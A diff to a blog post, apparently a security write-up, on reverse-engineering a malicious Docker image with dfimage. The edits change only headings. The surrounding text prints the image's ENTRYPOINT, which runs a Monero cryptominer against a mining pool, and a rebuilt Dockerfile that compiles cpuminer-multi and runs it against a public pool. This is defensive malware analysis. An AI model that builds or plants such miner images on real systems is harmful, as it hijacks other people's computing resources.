@@ -1,8 +1,6 @@
 ---
-title: Reverse-Engineering
+title: 3 - Reverse-Engineering a Malicious Dockerfile  
 ---
-
-# Reverse-Engineering a Malicious Dockerfile  
 
 Ever wondered how a malicious Docker image is built? By reverse-engineering its Dockerfile, we can uncover the attacker's thought process and gain valuable insights into how these images operate. To do this, I used **dfimage**, a tool from GitHub that reconstructs a Dockerfile based on the metadata and structure of an image. While the initial output wasn’t perfect, it provided a solid starting point:  
 
@@ -21,7 +19,7 @@ ENTRYPOINT ["/bin/minerd", "-a", "cryptonight", "-o", "stratum+tcp://xmr.pool.mi
 
 At first glance, this Dockerfile raises several red flags. It references a suspicious base image, adds unidentified files, installs dependencies, and compiles a cryptominer (`cpuminer-multi`). The **ENTRYPOINT** ensures that the miner runs automatically, connecting to a mining pool using predefined credentials.  
 
-## Refining the Dockerfile  
+# Refining the Dockerfile  
 
 To gain a clearer understanding of the image’s construction, I made several refinements:  
 
@@ -46,7 +44,7 @@ To gain a clearer understanding of the image’s construction, I made several re
    - The original image mined Monero using an attacker-controlled wallet.  
    - To test the setup in a controlled environment, I replaced the credentials with a random wallet and pointed it to a known mining pool.  
 
-## The Final Reconstructed Dockerfile  
+# The Final Reconstructed Dockerfile  
 
 After making these improvements, I arrived at a much cleaner and more functional version of the Dockerfile:  
 
@@ -65,7 +63,7 @@ ENTRYPOINT ["/cpuminer-multi/cpuminer", "-a", "cryptonight", "-o",
     "stratum+tcp://pool.supportxmr.com:3333", "-u", "[random monero wallet]", "-p", "x", "-t", "1"]
 ```  
 
-## Key Takeaways  
+# Key Takeaways  
 
 - **Attackers use misleading base images** to disguise their intent.  
 - **Automated tools like `dfimage` help reconstruct a Dockerfile**, but manual refinements are necessary.  
